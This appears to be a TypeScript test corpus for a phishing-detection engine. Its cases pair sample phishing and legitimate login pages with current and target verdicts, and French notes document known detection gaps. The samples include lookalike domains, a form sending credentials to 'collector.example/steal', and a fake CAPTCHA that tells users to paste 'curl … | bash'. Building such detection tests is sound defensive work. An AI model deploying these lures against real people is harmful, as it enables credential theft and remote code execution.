// Evaluation corpus for the detection engine.
//
// Two fields carry the whole point of this file:
//
//   current — the verdict the engine produces TODAY. Asserted, so any change in
//             behaviour shows up as a failing test rather than as a silent drift.
//   goal    — the verdict the case SHOULD produce. When it differs from
//             `current`, the case is a known gap, named and counted.
//
// Recording the gaps is what makes progress measurable. A corpus that only
// contains what already works tells you nothing about what is missing, and the
// engine's blind spots are precisely what needs a number attached to it.
//
// The negative half matters more than the positive one. A false positive on a
// security tool destroys trust faster than a missed detection builds it, and
// "zero strong alert on legitimate pages" is the property everything else rests
// on. Hence the emphasis on legitimate pages that LOOK like traps: delegated
// SSO, payment iframes, banks whose domain has nothing to do with their name.

export type Verdict = "silent" | "banner" | "interstitial";

export interface Case {
  id: string;
  /** Attack family, or "legit" for the negative half. */
  class: string;
  url: string;
  html: string;
  /** What the engine does today. Asserted. */
  current: Verdict;
  /** What it ought to do. Equal to `current` when there is no gap. */
  goal: Verdict;
  note: string;
}

const LOGIN_FORM = `<form action="/auth"><input type="email" name="email">
  <input type="password" name="password"></form>`;

export const CASES: Case[] = [
  // ---------------------------------------------------------------- positives

  {
    id: "homograph-paypal",
    class: "homograph",
    url: "https://paypa1.top/login",
    html: `<h1>PayPal</h1>${LOGIN_FORM}`,
    current: "interstitial",
    goal: "interstitial",
    note: "Le « 1 » se normalise en « l » : homograph@PayPal (35, signal d'identité) + TLD faible → ×2 → écran plein.",
  },
  {
    id: "combosquat-paypal-securite",
    class: "combosquat",
    url: "https://paypal-securite.top/login",
    html: `<h1>PayPal</h1>${LOGIN_FORM}`,
    current: "silent",
    goal: "interstitial",
    note: "TROU (#47), et le plus gênant du lot. Le domaine contient « paypal » EN TOUTES LETTRES, le signal porte bien brand=PayPal — mais l1.combosquat ne figure pas dans identitySignals. Donc pas de ×2 : 20 + 5 = 25, sous le seuil du bandeau. Silence. La forme la plus banale du phishing par SMS, et la variante avec un chiffre (ci-dessus) est mieux traitée.",
  },
  {
    id: "brand-subdomain-impots",
    class: "brand-subdomain",
    url: "https://impots.gouv.fr.verification-fiscale.xyz/acces",
    html: `<h1>impots.gouv.fr</h1>${LOGIN_FORM}`,
    current: "interstitial",
    goal: "interstitial",
    note: "La marque en sous-domaine d'un domaine étranger — la forme la plus courante en SMS.",
  },
  {
    id: "homograph-ameli",
    class: "homograph",
    url: "https://аmeli.fr/connexion",
    html: `<h1>Ameli</h1>${LOGIN_FORM}`,
    current: "interstitial",
    goal: "interstitial",
    note: "Le « a » initial est cyrillique. Indiscernable dans une barre d'adresse.",
  },
  {
    id: "borrowed-assets-lbp",
    class: "borrowed-brand-assets",
    url: "https://espace-client-secure.click/login",
    html: `<img src="https://labanquepostale.fr/logo.png" alt="logo">${LOGIN_FORM}`,
    current: "banner",
    goal: "interstitial",
    note: "TROU DE SEUIL. Logo hotlinké depuis la vraie marque + TLD faible = 25 + 5 = 30, ×2 = 60, sous les 70 de l'écran plein. Un logo de banque emprunté sur un domaine en .click avec formulaire de connexion ne produit qu'un bandeau. L'interstitiel exige 36 de score de base, soit DEUX signaux forts — un seul signal d'identité n'y suffit jamais, quelle que soit sa netteté.",
  },
  {
    id: "generic-kit-cross-origin",
    class: "generic-kit",
    url: "https://secure-verify-account.top/signin",
    html: `<h1>Connexion</h1>
      <form action="https://collector.example/steal">
        <input type="email" name="email"><input type="password" name="password">
        <input type="password" name="pin" style="display:none">
      </form>`,
    current: "banner",
    goal: "banner",
    note: "Aucune marque en jeu : formulaire cross-origin + champ caché. Bandeau, jamais plus — c'est voulu.",
  },

  // ------------------------------------------------- positives : trous connus

  {
    id: "unknown-brand-clean-kit",
    class: "hors-registre",
    url: "https://mutuelle-verification.com/espace",
    html: `<h1>Mutuelle Saint-Martin — Espace adhérent</h1>
      <p>Connectez-vous pour accéder à vos remboursements.</p>${LOGIN_FORM}`,
    current: "silent",
    goal: "banner",
    note: "TROU (#38). Marque hors registre, kit soigné : domaine banal, formulaire same-origin, aucun champ caché. Score nul, silence total.",
  },
  {
    id: "bitb-fake-google-window",
    class: "browser-in-the-browser",
    url: "https://promo-jeu-concours.example/participer",
    html: `<div class="fake-window">
        <div class="titlebar">Se connecter avec Google</div>
        <div class="urlbar">🔒 https://accounts.google.com/signin</div>
        ${LOGIN_FORM}
      </div>`,
    current: "silent",
    goal: "interstitial",
    note: "TROU (#42). La page IMPRIME l'adresse d'une autre marque à côté d'un champ mot de passe. L'incohérence est écrite en toutes lettres, et personne ne la lit.",
  },
  {
    id: "clickfix-fake-captcha",
    class: "clickfix",
    url: "https://verification-humaine.top/check",
    html: `<h1>Vérifiez que vous êtes humain</h1>
      <p>Appuyez sur <b>⌘ + Espace</b>, tapez <b>Terminal</b>, puis collez :</p>
      <code>curl -s https://x.example/i.sh | bash</code>
      <button>Je ne suis pas un robot</button>`,
    current: "silent",
    goal: "interstitial",
    note: "TROU (#37). Aucun champ de saisie, donc L0 ne déclenche pas et TOUTE la cascade reste muette. Le trou est la porte d'entrée, pas un signal manquant.",
  },
  {
    id: "free-hosting-subdomain-kit",
    class: "hebergement-gratuit",
    url: "https://banque-secure-login.pages.dev/acces",
    html: `<h1>Connexion sécurisée</h1>
      <form action="https://autre-kit.pages.dev/collect">
        <input type="email" name="u"><input type="password" name="p"></form>`,
    current: "silent",
    goal: "banner",
    note: "TROU (#39). Les deux hôtes ont le même domaine enregistrable (pages.dev absent des suffixes publics), donc ils passent pour same-site et le signal cross-origin ne se lève pas.",
  },

  // ---------------------------------------------------------------- negatives

  {
    id: "legit-google",
    class: "legit",
    url: "https://accounts.google.com/signin",
    html: `<h1>Se connecter</h1>${LOGIN_FORM}`,
    current: "silent",
    goal: "silent",
    note: "Domaine possédé par la marque : L1 se tait, garde anti-faux-positif principal.",
  },
  {
    id: "legit-microsoft-sso",
    class: "legit",
    url: "https://login.microsoftonline.com/common/oauth2/authorize",
    html: `<h1>Microsoft</h1>${LOGIN_FORM}`,
    current: "silent",
    goal: "silent",
    note: "Délégué d'authentification déclaré : la forme même du SSO légitime.",
  },
  {
    id: "legit-lbp-delegate",
    class: "legit",
    url: "https://www.labanquepostale.fr/connexion",
    html: `<h1>La Banque Postale</h1>
      <form action="https://auth.wl-fr.com/login">
        <input name="id"><input type="password" name="pw"></form>`,
    current: "silent",
    goal: "silent",
    note: "Formulaire cross-origin vers le délégué de SA marque : le remède aux faux positifs, et le cas le plus proche d'un vrai piège.",
  },
  {
    id: "legit-3ds-iframe",
    class: "legit",
    url: "https://www.amazon.fr/checkout",
    html: `<iframe src="https://acs.cardnetwork.example/3ds" width="400" height="300"></iframe>
      <form action="/pay"><input name="cardnumber" autocomplete="cc-number"></form>`,
    current: "silent",
    goal: "silent",
    note: "3-D Secure : un secret saisi dans une frame tierce, parfaitement normal. Le contre-exemple qui interdit d'alerter là-dessus seul.",
  },
  {
    id: "legit-unknown-saas",
    class: "legit",
    url: "https://app.some-saas-tool.com/login",
    html: `<h1>Log in to Acme Tools</h1>${LOGIN_FORM}`,
    current: "silent",
    goal: "silent",
    note: "Marque inconnue, structure propre. Doit rester silencieux — c'est la contrainte qui rend #38 difficile.",
  },
  {
    id: "legit-bank-unrelated-domain",
    class: "legit",
    url: "https://www.mabanque-en-ligne.fr/espace-client",
    html: `<h1>Crédit Régional du Sud — Espace client</h1>${LOGIN_FORM}`,
    current: "silent",
    goal: "silent",
    note: "PIÈGE POUR #38 : banque légitime dont le domaine n'a aucune parenté lexicale avec le nom commercial. Exactement ce que la détection hors registre ferait hurler.",
  },
  {
    id: "legit-docs-with-shell-command",
    class: "legit",
    url: "https://docs.exemple-outil.dev/installation",
    html: `<h1>Installation</h1>
      <p>Dans un terminal :</p>
      <code>curl -fsSL https://exemple-outil.dev/install.sh | sh</code>`,
    current: "silent",
    goal: "silent",
    note: "PIÈGE POUR #37 : une doc légitime affiche une commande shell. Ne JAMAIS alerter sur la seule présence d'une commande — il faut la conjonction avec le faux CAPTCHA ou l'injonction clavier.",
  },
];
